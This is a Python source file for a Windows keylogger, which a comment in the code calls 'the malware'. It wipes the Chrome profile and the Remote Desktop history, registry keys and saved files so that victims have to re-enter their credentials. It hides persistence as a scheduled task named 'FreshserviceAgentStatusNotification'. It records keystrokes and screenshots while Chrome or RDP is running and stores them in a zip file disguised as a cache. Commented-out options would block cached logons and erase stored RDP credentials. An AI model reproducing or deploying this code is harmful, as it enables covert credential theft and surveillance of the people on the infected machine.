import psutil, os, winreg, pynput, shutil, threading, time, pyautogui, zipfile, win32com.client, subprocess
from datetime import datetime, timedelta

operation_folder = os.getenv('APPDATA') + "\Microsoft"

class Logger:

    def __init__(self):
        self.chrome_alive = False
        self.rdp_alive = False
        self.deleted_chrome_cache = False
        self.deleted_rdp_cache = False
        self.keys = []


    def check_if_chrome_open(self):
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] == 'chrome.exe':
                self.chrome_alive = True
                return
        self.chrome_alive = False



    def check_if_rdp_open(self):
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] == 'mstsc.exe':
                self.rdp_alive = True
                return
        self.rdp_alive = False



def delete_chrmoe_cache_folder():
    try:
        shutil.rmtree(r"{}\AppData\Local\Google\Chrome".format(os.environ['USERPROFILE']))
        k_logger.deleted_chrome_cache = True
    except FileNotFoundError as e:
        #return "User probably doesn't uses chrome"
        print(e)


def delete_all_rdp_cache():
    Registry_Operations1()
    Registry_Operations2()
    #Registry_Operations3()  read the function itself before uncommenting
    delete_Default_rdp_files()
    k_logger.deleted_rdp_cache = True


########################################################## Persistance Start #######################################################################

def persistance():
    # Connect to the Scheduler
    scheduler = win32com.client.Dispatch('Schedule.Service')
    scheduler.Connect()
    root_folder = scheduler.GetFolder('\\')
    task_def = scheduler.NewTask(0)

    # Next run time
    start_time = datetime.now() - timedelta(minutes=1)

    # Tell it to run daily
    trigger = task_def.Triggers.Create(2)

    # This task will be deleted in 1000 days
    trigger.Repetition.Duration = "P1000D"

    # Repeat every 24 hours
    trigger.Repetition.Interval = "PT24H"
    trigger.StartBoundary = start_time.isoformat()

    # Select the operation type. I chose commandline operation. Must choose this to run a script or executable
    action = task_def.Actions.Create(0)
    action.ID = 'FreshserviceAgentStatusNotification'
    action.Path = r'{}'.format(__file__)

    # Set parameters
    task_def.RegistrationInfo.Description = 'FreshserviceAgentStatusNotification'
    task_def.Settings.Enabled = True
    task_def.Settings.StopIfGoingOnBatteries = False

    # Register task
    # If task already exists, it will be updated
    TASK_CREATE_OR_UPDATE = 6
    TASK_LOGON_NONE = 0
    root_folder.RegisterTaskDefinition(
        'Test Task',  # Task name
        task_def,
        TASK_CREATE_OR_UPDATE,
        '',  # No user
        '',  # No password
        TASK_LOGON_NONE
    )

########################################################## Persistance End #########################################################################



########################################################## Delete registy keys Start ###############################################################

def Registry_Operations1():
    try:
        #Open "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"
        with winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER) as Current_user:
            with winreg.OpenKey(Current_user, r"Software\Microsoft\Terminal Server Client\Default", 0, winreg.KEY_ALL_ACCESS) as Default:

                #Gets all the values under the above key, and return a list that contains each one.
                def get_values():
                    i = 0
                    value_list = []
                    while True:
                        try:
                            value_list.append(winreg.EnumValue(Default, i))
                            i += 1
                        except WindowsError as e:
                            return value_list

                #Delete each value in the list
                def delete_values():
                    values_to_delete = get_values()
                    for value in values_to_delete:
                        winreg.DeleteValue(Default, value[0])


                delete_values()

    except FileNotFoundError as e:
        return "Registry not found, Probably never used RDP"


def Registry_Operations2():
    #open the HKEY_CURRENT_USER key
    with winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER) as Current_user :

        #This function is used for deleting all the subkeys of: "Software\Microsoft\Terminal Server Client\Servers" and then the key itself. Winreg can't delete key with subkeys.
        def delete_key(Current_user, key = r"Software\Microsoft\Terminal Server Client\Servers"):
            index_of_subkeys = 0
            subkeys_list = []

            #Recursively get all the subkeys of a key
            try:
                with winreg.OpenKey(Current_user, key, 0, winreg.KEY_ALL_ACCESS) as Servers:
                    while True:
                        try:
                            #Check how many subkeys there are with incrementing index. Returns OSError when no more subkeys.
                            subkeys_list.append(winreg.EnumKey(Servers, index_of_subkeys))
                            index_of_subkeys += 1
                        except OSError as e:
                            break

                    #If has key has subkeys, start the same process for each of them. If no subkeys, delte the key.
                    if len(subkeys_list) > 0:
                        for subkey in subkeys_list:
                            delete_key(Current_user, "{}\{}".format(key, subkey))
                        #After deleteing all the subkeys in the list, delete the key iteslf.
                        winreg.DeleteKey(Current_user, key)
                    else:
                        winreg.DeleteKey(Current_user, key)

            #If "Software\Microsoft\Terminal Server Client\Servers" can't be found.
            except FileNotFoundError as e:
                return "Registry not found, Probably never used RDP"

        #After deleting the key, we need to create it again.
        def add_key_again():
            winreg.CreateKey(Current_user, r"Software\Microsoft\Terminal Server Client\Servers")


        delete_key(Current_user)
        add_key_again()


"""
Uncomment this part only if all the criteria below are met:
1) The target is part of a domain and can't access the DC for authentication.
2) IT didn't set the GPO 'Interactive Logon: Number of previous logons to cache' to 0 (which is a known best practice).
3) The malware is running with local admin privileges 


def Registry_Operations3():
    try:
        # Open "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        with winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE) as local_machine:
            with winreg.OpenKey(local_machine, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0,winreg.KEY_ALL_ACCESS) as winlogon:
                #Set the data of CachedLogonsCount to 0
                winreg.SetValueEx(winlogon, "CachedLogonsCount", 0, winreg.REG_SZ, "0")
    except PermissionError as e:
        print("Not running with local admin")

"""


########################################################## Delete registy keys end ###############################################################


#We must delete the follwing files:  %AppData%\Microsoft\Windows\Recent\AutomaticDestinations  &   %userprofile%\documents\Default.rdp
def delete_Default_rdp_files():
    documents_folder = r"{}\documents".format(os.environ['USERPROFILE'])
    for file in os.listdir(documents_folder):
        if file[-3:] == 'rdp':
            os.remove("{}\{}".format(documents_folder, file))

    #####  This file can't be seen in the GUI, but still exists.  #####
    AutomaticDestinations = r"{}\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations".format(os.environ['USERPROFILE'])
    print(AutomaticDestinations)
    shutil.rmtree(AutomaticDestinations)


    """
    Uncomment this only if the target checks the following check box: 'Allow me to save credentials'. Usually Admins disable this option with GP
    No special privileges are required. Uses CMD command, so will open cmd.exe as child process.
    
    command = 'For /F "tokens=1,2 delims= " %G in (\'cmdkey /list ^| findstr "target=TERMSRV"\') do cmdkey /delete %H'
    p1 = subprocess.run(command, shell=True, capture_output=True)
    print("[+] {}\n\n[-] {}".format(p1.stdout, p1.stderr))
    """




def take_screenshot():
    os.chdir(operation_folder)
    screenshot_name ="{}.png".format(str(datetime.now()).split(".")[0].replace(":", ";"))
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_name)

    add_files_to_zip(screenshot_name)



def add_files_to_zip(file_name):
    os.chdir(operation_folder)
    with zipfile.ZipFile("Cache.zip", mode="a") as zf:
        zf.write(file_name)
    os.remove(file_name)



def on_press(key):
    k = str(key).replace("'", "")
    if k == 'Key.enter':
        k_logger.keys.append('\n')
    elif k == 'Key.space':
        k_logger.keys.append(" ")
    elif k == 'Key.backspace':
        try:
            del k_logger.keys[-1]
        except IndexError:
            pass
    elif k == 'Key.shift': # if user pressed Shift
        pass
    elif len(k) > 1:  # If any other key that isn't a character is pressed.
        k_logger.keys.append(' {} '.format(k))
    else:
        k_logger.keys.append(k)



def start_Logger():
    with pynput.keyboard.Listener(on_press=on_press) as listner:
        def stop_logger():
            start_time = time.time()
            while True:
                if datetime.now().second % 10 == 0:
                    take_screenshot()
                    time.sleep(1)

                if time.time()- start_time > 60:
                    break
            listner.stop()

        threading.Thread(target=stop_logger).start()
        listner.join()

    os.chdir(operation_folder)
    txt_file_name = "{}.txt".format(str(datetime.now()).split(".")[0].replace(":", ";"))
    with open(txt_file_name, "w") as f:
        f.write("".join(k_logger.keys))
    add_files_to_zip(txt_file_name)



k_logger = Logger()
delete_all_rdp_cache()
try:
    persistance()
except:
    pass

while True:
    k_logger.check_if_chrome_open()
    if k_logger.chrome_alive == False and k_logger.deleted_chrome_cache == False:
        delete_chrmoe_cache_folder()
        print("[+] deleted chrome Cache")

    k_logger.check_if_rdp_open()
    if k_logger.rdp_alive == False and k_logger.deleted_rdp_cache == False:
        delete_all_rdp_cache()
        print("[+] Deleted RDP Cache")

    if k_logger.chrome_alive == True and k_logger.deleted_chrome_cache == True:
        start_Logger()
        k_logger.deleted_chrome_cache = False
        print("[+] Logger started beacuse of chrome")


    if k_logger.rdp_alive == True and k_logger.deleted_rdp_cache == True:
        start_Logger()
        k_logger.deleted_rdp_cache = False
        print("[+] Logger started beacuse of RDP")


